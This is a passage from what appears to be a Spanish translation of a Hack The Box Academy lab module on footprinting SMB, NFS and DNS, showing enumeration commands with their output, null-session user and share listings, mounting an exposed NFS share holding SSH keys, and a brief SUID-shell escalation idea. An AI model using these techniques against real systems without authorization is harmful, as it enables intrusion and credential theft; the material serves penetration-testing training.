        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        home                                                    NO ACCESS       INFREIGHT Samba
        dev                                                     NO ACCESS       DEVenv
        notes                                                   NO ACCESS       CheckIT
        IPC$                                                    NO ACCESS       IPC Service (DEVSM)
```

#### CrackMapExec

  SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''

SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```

Otra herramienta que vale la pena mencionar es la llamada [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), que se basa en una herramienta más antigua, enum4linux. Esta herramienta automatiza muchas de las consultas, pero no todas, y puede devolver una gran cantidad de información.

#### Enum4Linux-ng - Instalación

  SMB

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
vcrdcr@htb[/htb]$ cd enum4linux-ng
vcrdcr@htb[/htb]$ pip3 install -r requirements.txt
```

#### Enum4Linux-ng - Enumeración

  SMB

```shell-session
vcrdcr@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.14.128
[*] Username ......... ''
[*] Random Username .. 'juzgtcsu'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Service Scan on 10.129.14.128    |
 =====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    NetBIOS Names and Workgroup for 10.129.14.128    |
 =====================================================
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
- DEVSMB          <00> -         H <ACTIVE>  Workstation Service
- DEVSMB          <03> -         H <ACTIVE>  Messenger Service
- DEVSMB          <20> -         H <ACTIVE>  File Server Service
- ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
- DEVOPS          <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
- DEVOPS          <1d> -         H <ACTIVE>  Master Browser
- DEVOPS          <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
- MAC Address = 00-00-00-00-00-00

 ==========================================
|    SMB Dialect Check on 10.129.14.128    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: false

 ==========================================
|    RPC Session Check on 10.129.14.128    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[+] Server allows session using username 'juzgtcsu', password ''
[H] Rerunning enumeration with user 'juzgtcsu' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.14.128    |
 ====================================================
[+] Domain: DEVOPS
[+] SID: NULL SID
[+] Host is part of a workgroup (not a domain)

 ============================================================
|    Domain Information via SMB session for 10.129.14.128    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DEVSMB
NetBIOS domain name: ''
DNS domain: ''
FQDN: htb

 ================================================
|    OS Information via RPC for 10.129.14.128    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT DEVSM

 ======================================
|    Users via RPC on 10.129.14.128    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 users via 'enumdomusers'
[+] After merging user results we have 2 users total:
'1000':
  username: mrb3n
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: cry0l1t3
  name: cry0l1t3
  acb: '0x00000014'
  description: ''

 =======================================
|    Groups via RPC on 10.129.14.128    |
 =======================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 =======================================
|    Shares via RPC on 10.129.14.128    |
 =======================================
[*] Enumerating shares
[+] Found 5 share(s):
IPC$:
  comment: IPC Service (DEVSM)
  type: IPC
dev:
  comment: DEVenv
  type: Disk
home:
  comment: INFREIGHT Samba
  type: Disk
notes:
  comment: CheckIT
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share dev
[-] Share doesn't exist
[*] Testing share home
[+] Mapping: OK, Listing: OK
[*] Testing share notes
[+] Mapping: OK, Listing: OK
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A

 ==========================================
|    Policies via RPC for 10.129.14.128    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: None
  min_pw_length: 5
  min_pw_age: none
  max_pw_age: 49710 days 6 hours 21 minutes
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: None
domain_logoff_information:
  force_logoff_time: 49710 days 6 hours 21 minutes

 ==========================================
|    Printers via RPC for 10.129.14.128    |
 ==========================================
[+] No printers returned (this is not an error)

Completed after 0.61 seconds
```

Necesitamos usar más de dos herramientas para la enumeración. Porque puede suceder que debido a la programación de las herramientas, obtengamos información diferente que tenemos que comprobar manualmente. Por lo tanto, nunca debemos confiar solo en herramientas automatizadas donde no sabemos con precisión cómo se escribieron.


# NFS

---

`Network File System` (`NFS`) es un sistema de archivos de red desarrollado por Sun Microsystems y tiene el mismo propósito que SMB. Su propósito es acceder a los sistemas de archivos a través de una red como si fueran locales. Sin embargo, utiliza un protocolo completamente diferente. [NFS](https://en.wikipedia.org/wiki/Network_File_System) se utiliza entre sistemas Linux y Unix. Esto significa que los clientes NFS no pueden comunicarse directamente con los servidores SMB. NFS es un estándar de Internet que rige los procedimientos en un sistema de archivos distribuido. Mientras que el protocolo NFS versión 3.0 (`NFSv3`), que ha estado en uso durante muchos años, autentica la computadora del cliente, esto cambia con `NFSv4`. Aquí, como con el protocolo SMB de Windows, el usuario debe autenticarse.

|**Versión**|**Características**|
|---|---|
|`NFSv2`|Es más antiguo, pero es compatible con muchos sistemas y inicialmente se operó por completo a través de UDP.|
|`NFSv3`|Tiene más características, incluido el tamaño de archivo variable y mejores informes de errores, pero no es totalmente compatible con los clientes NFSv2.|
|`NFSv4`|Incluye Kerberos, funciona a través de firewalls y en Internet, ya no requiere portmappers, admite ACL, aplica operaciones basadas en el estado y proporciona mejoras de rendimiento y alta seguridad. También es la primera versión que tiene un protocolo de estado.|

NFS versión 4.1 ([RFC 8881](https://datatracker.ietf.org/doc/html/rfc8881)) tiene como objetivo proporcionar soporte de protocolo para aprovechar las implementaciones de servidores de clúster, incluida la capacidad de proporcionar acceso paralelo escalable a archivos distribuidos en múltiples servidores (extensión pNFS). Además, NFSv4.1 incluye un mecanismo de enlace de sesión, también conocido como multitrayecto NFS. Una ventaja significativa de NFSv4 sobre sus predecesores es que solo un puerto UDP o TCP `2049` se utiliza para ejecutar el servicio, lo que simplifica el uso del protocolo en los firewalls.

NFS se basa en el [Llamada de Procedimiento Remoto de Computación de Red Abierta](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocolo expuesto en `TCP` y `UDP` puertos `111`, que utiliza [Representación de Datos Externos](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) para el intercambio de datos independiente del sistema. El protocolo NFS tiene `no` mecanismo para `authentication` o `authorization`. En cambio, la autenticación se desplaza completamente a las opciones del protocolo RPC. La autorización se deriva de la información disponible del sistema de archivos. En este proceso, el servidor es responsable de traducir la información del usuario del cliente al formato del sistema de archivos y convertir los detalles de autorización correspondientes en la sintaxis UNIX requerida con la mayor precisión posible.

La autenticación más común es a través de UNIX `UID`/`GID` y `group memberships`, por lo que es más probable que esta sintaxis se aplique al protocolo NFS. Un problema es que el cliente y el servidor no necesariamente tienen que tener las mismas asignaciones de UID/GID a usuarios y grupos, y el servidor no necesita hacer nada más. No se pueden realizar más comprobaciones por parte del servidor. Esta es la razón por la cual NFS solo debe usarse con este método de autenticación en redes confiables.

---

## Configuración Predeterminada

NFS no es difícil de configurar porque no hay tantas opciones como FTP o SMB tienen. El `/etc/exports` el archivo contiene una tabla de sistemas de archivos físicos en un servidor NFS accesible por los clientes. El [Tabla de Exportaciones NFS](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) muestra qué opciones acepta y, por lo tanto, indica qué opciones están disponibles para nosotros.

#### Archivo de Exportaciones

  NFS

```shell-session
vcrdcr@htb[/htb]$ cat /etc/exports 

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

El valor predeterminado `exports` el archivo también contiene algunos ejemplos de configuración de recursos compartidos NFS. Primero, la carpeta se especifica y se pone a disposición de otros, y luego los derechos que tendrán en este recurso compartido NFS se conectan a un host o una subred. Finalmente, se pueden agregar opciones adicionales a los hosts o subredes.

|**Opción**|**Descripción**|
|---|---|
|`rw`|Permisos de lectura y escritura.|
|`ro`|Permisos de solo lectura.|
|`sync`|Transferencia de datos síncrona. (Un poco más lento)|
|`async`|Transferencia de datos asíncrona. (Un poco más rápido)|
|`secure`|No se utilizarán puertos por encima de 1024.|
|`insecure`|Se utilizarán puertos por encima de 1024.|
|`no_subtree_check`|Esta opción deshabilita la comprobación de los árboles de subdirectorio.|
|`root_squash`|Asigna todos los permisos a archivos de root UID/GID 0 al UID/GID de anonymous, lo que impide `root` desde el acceso a archivos en un montaje NFS.|

Creemos dicha entrada para fines de prueba y juguemos con la configuración.

#### Exportaciones

  NFS

```shell-session
root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
root@nfs:~# systemctl restart nfs-kernel-server 
root@nfs:~# exportfs

/mnt/nfs      	10.129.14.0/24
```

Hemos compartido la carpeta `/mnt/nfs` a la subred `10.129.14.0/24` con la configuración mostrada arriba. Esto significa que todos los hosts de la red podrán montar este recurso compartido NFS e inspeccionar el contenido de esta carpeta.

---

## Configuración Peligrosa

Sin embargo, incluso con NFS, algunas configuraciones pueden ser peligrosas para la empresa y su infraestructura. Aquí están algunos de ellos enumerados:

|**Opción**|**Descripción**|
|---|---|
|`rw`|Permisos de lectura y escritura.|
|`insecure`|Se utilizarán puertos por encima de 1024.|
|`nohide`|Si se montó otro sistema de archivos debajo de un directorio exportado, este directorio se exporta por su propia entrada de exportaciones.|
|`no_root_squash`|Todos los archivos creados por root se mantienen con el UID/GID 0.|

Es muy recomendable crear una VM local y experimentar con la configuración. Descubriremos métodos que nos mostrarán cómo está configurado el servidor NFS. Para ello, podemos crear varias carpetas y asignar diferentes opciones a cada una. Luego podemos inspeccionarlos y ver qué configuraciones pueden tener qué efecto en el recurso compartido de NFS y sus permisos y el proceso de enumeración.

Podemos echar un vistazo al `insecure` opción. Esto es peligroso porque los usuarios pueden usar puertos por encima de 1024. Los primeros 1024 puertos solo pueden ser utilizados por root. Esto evita el hecho de que ningún usuario puede usar sockets por encima del puerto 1024 para el servicio NFS e interactuar con él.

---

## Huella del Servicio

Al hacer pisar NFS, los puertos TCP `111` y `2049` son esenciales. También podemos obtener información sobre el servicio NFS y el host a través de RPC, como se muestra a continuación en el ejemplo.

#### Mapa

  NFS

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

El `rpcinfo` El script NSE recupera una lista de todos los servicios RPC que se ejecutan actualmente, sus nombres y descripciones, y los puertos que utilizan. Esto nos permite verificar si el recurso compartido de destino está conectado a la red en todos los puertos requeridos. Además, para NFS, Nmap tiene algunos scripts NSE que se pueden usar para los escaneos. Estos pueden mostrarnos, por ejemplo, el `contents` de la parte y su `stats`.

  NFS

```shell-session
vcrdcr@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

Una vez que hayamos descubierto dicho servicio NFS, podemos montarlo en nuestra máquina local. Para esto, podemos crear una nueva carpeta vacía a la que se montará el recurso compartido NFS. Una vez montado, podemos navegar y ver el contenido al igual que nuestro sistema local.

#### Mostrar Acciones NFS Disponibles

  NFS

```shell-session
vcrdcr@htb[/htb]$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

#### Montaje NFS Compartir

  NFS

```shell-session
vcrdcr@htb[/htb]$ mkdir target-NFS
vcrdcr@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
vcrdcr@htb[/htb]$ cd target-NFS
vcrdcr@htb[/htb]$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

Allí tendremos la oportunidad de acceder a los derechos y los nombres de usuario y grupos a los que pertenecen los archivos mostrados y visibles. Porque una vez que tenemos los nombres de usuario, nombres de grupo, UID y GUID, podemos crearlos en nuestro sistema y adaptarlos al recurso compartido NFS para ver y modificar los archivos.

#### Listar Contenido con Nombres de Usuario y Nombres de Grupo

  NFS

```shell-session
vcrdcr@htb[/htb]$ ls -l mnt/nfs/

total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

#### Listar Contenido con UID y GUID

  NFS

```shell-session
vcrdcr@htb[/htb]$ ls -n mnt/nfs/

total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

Es importante tener en cuenta que si el `root_squash` la opción está establecida, no podemos editar el `backup.sh` archivo incluso como `root`.

También podemos usar NFS para una mayor escalada. Por ejemplo, si tenemos acceso al sistema a través de SSH y queremos leer archivos de otra carpeta que un usuario específico pueda leer, necesitaríamos cargar un shell al recurso compartido NFS que tiene el `SUID` de ese usuario y luego ejecute el shell a través del usuario SSH.

Después de haber realizado todos los pasos necesarios y haber obtenido la información que necesitamos, podemos desmontar el recurso compartido NFS.

#### Desmontando

  NFS

```shell-session
vcrdcr@htb[/htb]$ cd ..
vcrdcr@htb[/htb]$ sudo umount ./target-NFS
```



# DNS

---

`Domain Name System` (`DNS`) es una parte integral de Internet. Por ejemplo, a través de nombres de dominio, como [academia.hackthebox.com](https://academy.hackthebox.com/) o [www.en.hackthebox.com](https://www.hackthebox.eu/), podemos llegar a los servidores web a los que el proveedor de alojamiento ha asignado una o más direcciones IP específicas. DNS es un sistema para resolver nombres de computadoras en direcciones IP, y no tiene una base de datos central. Simplificado, podemos imaginarlo como una biblioteca con muchas guías telefónicas diferentes. La información se distribuye en muchos miles de servidores de nombres. Los servidores DNS distribuidos globalmente traducen nombres de dominio a direcciones IP y, por lo tanto, controlan a qué servidor puede llegar un usuario a través de un dominio en particular. Hay varios tipos de servidores DNS que se utilizan en todo el mundo:

- Servidor raíz DNS
- Servidor de nombres autorizado
- Servidor de nombres no autorizado
- Servidor de almacenamiento en caché
- Reenviar servidor
- Resolver

|**Tipo de Servidor**|**Descripción**|
|---|---|
|`DNS Root Server`|Los servidores raíz del DNS son responsables de los dominios de nivel superior (`TLD`). Como última instancia, solo se solicitan si el servidor de nombres no responde. Por lo tanto, un servidor raíz es una interfaz central entre los usuarios y el contenido en Internet, ya que vincula el dominio y la dirección IP. El [Corporación de Internet para Nombres y Números Asignados](https://www.icann.org/) (`ICANN`) coordina el trabajo de los servidores de nombres raíz. Hay `13` tales servidores raíz en todo el mundo.|
|`Authoritative Nameserver`|Los servidores de nombres autorizados tienen autoridad para una zona en particular. Solo responden consultas de su área de responsabilidad, y su información es vinculante. Si un servidor de nombres autorizado no puede responder a la consulta de un cliente, el servidor de nombres raíz se hace cargo en ese momento.|
|`Non-authoritative Nameserver`|Los servidores de nombres no autorizados no son responsables de una zona DNS en particular. En cambio, recopilan información sobre zonas DNS específicas, lo que se realiza mediante consultas DNS recursivas o iterativas.|
|`Caching DNS Server`|Almacenar en caché la información de caché de los servidores DNS de otros servidores de nombres durante un período específico. El servidor de nombres autorizado determina la duración de este almacenamiento.|
|`Forwarding Server`|Los servidores de reenvío realizan solo una función: reenvían consultas DNS a otro servidor DNS.|
|`Resolver`|Las soluciones no son servidores DNS autorizados, sino que realizan la resolución de nombres localmente en la computadora o el enrutador.|

DNS es principalmente sin cifrar. Por lo tanto, los dispositivos en la WLAN local y los proveedores de Internet pueden piratear y espiar las consultas DNS. Dado que esto representa un riesgo de privacidad, ahora hay algunas soluciones para el cifrado de DNS. Por defecto, se aplican profesionales de seguridad de TI `DNS over TLS` (`DoT`) o `DNS over HTTPS` (`DoH`) aquí. Además, el protocolo de red `DNSCrypt` también cifra el tráfico entre la computadora y el servidor de nombres.

Sin embargo, el DNS no solo vincula los nombres de las computadoras y las direcciones IP. También almacena y emite información adicional sobre los servicios asociados con un dominio. Por lo tanto, también se puede usar una consulta DNS, por ejemplo, para determinar qué computadora sirve como servidor de correo electrónico para el dominio en cuestión o cómo se llaman los servidores de nombres del dominio.

![Diagrama que muestra la jerarquía de dominios: Raíz, Dominios de Nivel Superior (TLD) como net, org, com, dev, io; Dominio de Segundo Nivel inlanefreight.com; Sub-Domains dev.inlanefreight.com, www.inlanefreight.com, mail.inlanefreight.com; Host WS01.dev.inlanefreight.com.](https://academy.hackthebox.com/storage/modules/27/tooldev-dns.png)

Diferente `DNS records` se utilizan para las consultas DNS, que tienen varias tareas. Además, existen entradas separadas para diferentes funciones, ya que podemos configurar servidores de correo y otros servidores para un dominio.

|**Registro DNS**|**Descripción**|
|---|---|
|`A`|Devuelve una dirección IPv4 del dominio solicitado como resultado.|
|`AAAA`|Devuelve una dirección IPv6 del dominio solicitado.|
|`MX`|Devuelve los servidores de correo responsables como resultado.|
|`NS`|Devuelve los servidores DNS (nameservers) del dominio.|
|`TXT`|Este registro puede contener información diversa. El todoterreno se puede utilizar, por ejemplo, para validar la Consola de búsqueda de Google o validar certificados SSL. Además, las entradas SPF y DMARC están configuradas para validar el tráfico de correo y protegerlo del spam.|
|`CNAME`|Este registro sirve como un alias para otro nombre de dominio. Si desea que el dominio www.hackthebox.eu apunte a la misma IP que hackthebox.eu, creará un registro A para hackthebox.eu y un registro CNAME para www.hackthebox.eu.|
|`PTR`|El registro PTR funciona al revés (búsqueda inversa). Convierte direcciones IP en nombres de dominio válidos.|
|`SOA`|Proporciona información sobre la zona DNS correspondiente y la dirección de correo electrónico del contacto administrativo.|

El `SOA` el registro se encuentra en el archivo de zona de un dominio y especifica quién es responsable del funcionamiento del dominio y cómo se administra la información DNS del dominio.

  DNS

```shell-session
vcrdcr@htb[/htb]$ dig soa www.inlanefreight.com

; <<>> DiG 9.16.27-Debian <<>> soa www.inlanefreight.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15876
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.inlanefreight.com.         IN      SOA

;; AUTHORITY SECTION:
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; Query time: 16 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Thu Jan 05 12:56:10 GMT 2023
;; MSG SIZE  rcvd: 128
```

El punto (.) se sustituye por un signo at (@) en la dirección de correo electrónico. En este ejemplo, la dirección de correo electrónico del administrador es `awsdns-hostmaster@amazon.com`.

---

## Configuración Predeterminada

Hay muchos tipos de configuración diferentes para DNS. Por lo tanto, solo discutiremos los más importantes para ilustrar mejor el principio funcional desde un punto de vista administrativo. Todos los servidores DNS funcionan con tres tipos diferentes de archivos de configuración:

1. archivos de configuración DNS locales
2. archivos de zona
3. revertir archivos de resolución de nombres

El servidor DNS [Bind9](https://www.isc.org/bind/) se usa muy a menudo en distribuciones basadas en Linux. Su archivo de configuración local (`named.conf`) se divide aproximadamente en dos secciones, en primer lugar la sección de opciones para la configuración general y en segundo lugar las entradas de zona para los dominios individuales. Los archivos de configuración locales suelen ser:

- `named.conf.local`
- `named.conf.options`
- `named.conf.log`

Contiene el RFC asociado donde podemos personalizar el servidor según nuestras necesidades y nuestra estructura de dominio con las zonas individuales para diferentes dominios. El archivo de configuración `named.conf` se divide en varias opciones que controlan el comportamiento del servidor de nombres. Se hace una distinción entre `global options` y `zone options`.

Las opciones globales son generales y afectan a todas las zonas. Una opción de zona solo afecta a la zona a la que está asignada. Las opciones que no figuran en named.conf tienen valores predeterminados. Si una opción es global y específica de la zona, entonces la opción de zona tiene prioridad.

#### Configuración de DNS Local

  DNS

```shell-session
root@bind9:~# cat /etc/bind/named.conf.local

//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";
zone "domain.com" {
    type master;
    file "/etc/bind/db.domain.com";
    allow-update { key rndc-key; };
};
```

En este archivo, podemos definir las diferentes zonas. Estas zonas se dividen en archivos individuales, que en la mayoría de los casos están destinados principalmente a un solo dominio. Las excepciones son ISP y servidores DNS públicos. Además, muchas opciones diferentes amplían o reducen la funcionalidad. Podemos buscarlos en el [documentación](https://wiki.debian.org/Bind9) de Bind9.

A `zone file` es un archivo de texto que describe una zona DNS con el formato de archivo BIND. En otras palabras, es un punto de delegación en el árbol DNS. El formato de archivo BIND es el formato de archivo de zona preferido por la industria y ahora está bien establecido en el software del servidor DNS. Un archivo de zona describe una zona completamente. Debe haber precisamente uno `SOA` registro y al menos uno `NS` grabar. El registro de recursos SOA generalmente se encuentra al comienzo de un archivo de zona. El objetivo principal de estas reglas globales es mejorar la legibilidad de los archivos de zona. Un error de sintaxis generalmente hace que todo el archivo de zona se considere inutilizable. El servidor de nombres se comporta de manera similar como si esta zona no existiera. Responde a las consultas DNS con un `SERVFAIL` mensaje de error.

En resumen, aquí, todo `forward records` se introducen de acuerdo con el formato BIND. Esto permite que el servidor DNS identifique a qué dominio, nombre de host y rol pertenecen las direcciones IP. En términos simples, esta es la guía telefónica donde el servidor DNS busca las direcciones de los dominios que está buscando.

#### Archivos de Zona

  DNS

```shell-session
root@bind9:~# cat /etc/bind/db.domain.com

;
; BIND reverse data file for local loopback interface
;
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

      IN     MX     10     mx.domain.com.
      IN     MX     20     mx2.domain.com.

             IN     A       10.129.14.5

server1      IN     A       10.129.14.5
server2      IN     A       10.129.14.7
ns1          IN     A       10.129.14.2
ns2          IN     A       10.129.14.3

ftp          IN     CNAME   server1
mx           IN     CNAME   server1
mx2          IN     CNAME   server2
www          IN     CNAME   server2
```

Para que la dirección IP se resuelva desde el `Fully Qualified Domain Name` (`FQDN`), el servidor DNS debe tener un archivo de búsqueda inversa. En este archivo, el nombre de la computadora (FQDN) se asigna al último octeto de una dirección IP, que corresponde al host respectivo, utilizando un `PTR` grabar. Los registros PTR son responsables de la traducción inversa de direcciones IP en nombres, como ya hemos visto en la tabla anterior.

#### Archivos de Zona de Resolución de Nombre Inverso

  DNS

```shell-session
root@bind9:~# cat /etc/bind/db.10.129.14

;
; BIND reverse data file for local loopback interface
;
$ORIGIN 14.129.10.in-addr.arpa
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

